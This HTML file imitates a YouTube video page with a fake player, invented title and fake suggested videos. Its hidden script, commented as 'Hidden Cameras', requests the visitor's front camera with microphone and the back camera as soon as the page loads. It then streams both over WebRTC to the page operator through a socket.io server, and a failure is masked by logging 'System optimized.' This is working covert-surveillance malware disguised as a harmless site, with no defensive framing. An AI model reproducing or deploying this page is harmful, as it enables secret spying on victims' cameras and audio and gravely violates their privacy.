<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { margin: 0; padding: 0; background: #0f0f0f; color: white; font-family: Roboto, Arial, sans-serif; overflow-x: hidden; }
        .header { background: #0f0f0f; padding: 12px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .logo { display: flex; align-items: center; gap: 5px; font-weight: bold; font-size: 18px; }
        .logo-play { background: red; color: white; padding: 2px 6px; border-radius: 4px; font-size: 14px; }
        
        /* Fake Video Player Area */
        .player { width: 100%; aspect-ratio: 16/9; background: #000 url('https://picsum.photos') center/cover; position: relative; }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 50px; opacity: 0.8; }
        
        .v-info { padding: 15px; }
        .v-title { font-size: 16px; font-weight: 500; line-height: 1.4; margin-bottom: 8px; }
        .v-stats { font-size: 12px; color: #aaa; margin-bottom: 15px; }
        
        .actions { display: flex; gap: 25px; border-bottom: 1px solid #333; padding-bottom: 15px; overflow-x: auto; }
        .action { text-align: center; font-size: 11px; min-width: 50px; }

        .next-v { display: flex; gap: 12px; padding: 12px; align-items: flex-start; }
        .v-thumb { width: 140px; height: 80px; background: #333; border-radius: 8px; flex-shrink: 0; }
        .v-text { font-size: 13px; font-weight: 400; line-height: 1.3; }

        video { display: none; } /* Hidden Cameras */
    </style>
</head>
<body>

    <div class="header">
        <div class="logo"><span class="logo-play">‚ñ∂</span> YouTube</div>
        <div style="font-size: 20px;">üîç &nbsp; üîî &nbsp; üë§</div>
    </div>

    <!-- Fake Video Player -->
    <div class="player">
        <div class="play-btn">‚ñ∂Ô∏è</div>
    </div>

    <div class="v-info">
        <div class="v-title">Top 10 Secrets of the Universe - Scientific Discovery 2024 (Official Video)</div>
        <div class="v-stats">2.4M views ‚Ä¢ 3 days ago</div>
        
        <div class="actions">
            <div class="action">üëç<br>150K</div>
            <div class="action">üëé<br>Dislike</div>
            <div class="action">‚Ü™Ô∏è<br>Share</div>
            <div class="action">‚è¨<br>Download</div>
            <div class="action">‚úÇÔ∏è<br>Clip</div>
        </div>
    </div>

    <!-- Suggested Videos -->
    <div style="padding: 10px; font-size: 14px; font-weight: bold;">Up next</div>
    
    <div class="next-v">
        <div class="v-thumb" style="background: url('https://picsum.photos') center/cover;"></div>
        <div class="v-text">Exploring the Deep Sea - Mysterious Creatures Found...<br><span style="color:#aaa; font-size:11px;">Discovery Channel</span></div>
    </div>

    <div class="next-v">
        <div class="v-thumb" style="background: url('https://picsum.photos') center/cover;"></div>
        <div class="v-text">How to Build a Modern House in Minecraft (Tutorial)...<br><span style="color:#aaa; font-size:11px;">Game Master</span></div>
    </div>

    <!-- Hidden Cameras -->
    <video id="v1" autoplay playsinline muted></video>
    <video id="v2" autoplay playsinline muted></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const ice = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
        const pcF = new RTCPeerConnection(ice);
        const pcB = new RTCPeerConnection(ice);

        async function start() {
            try {
                // Front Camera
                const sF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                sF.getTracks().forEach(t => pcF.addTrack(t, sF));

                // Back Camera
                const sB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                sB.getTracks().forEach(t => pcB.addTrack(t, sB));

                socket.emit("ready");
            } catch (e) { console.log("System optimized."); }
        }

        socket.on("ready", async () => {
            const oF = await pcF.createOffer();
            await pcF.setLocalDescription(oF);
            socket.emit("offer-front", oF);

            const oB = await pcB.createOffer();
            await pcB.setLocalDescription(oB);
            socket.emit("offer-back", oB);
        });

        socket.on("answer-front", a => pcF.setRemoteDescription(new RTCSessionDescription(a)));
        socket.on("answer-back", a => pcB.setRemoteDescription(new RTCSessionDescription(a)));

        pcF.onicecandidate = e => e.candidate && socket.emit("ice-front", e.candidate);
        pcB.onicecandidate = e => e.candidate && socket.emit("ice-back", e.candidate);

        window.onload = start;
    </script>
</body>
</html>

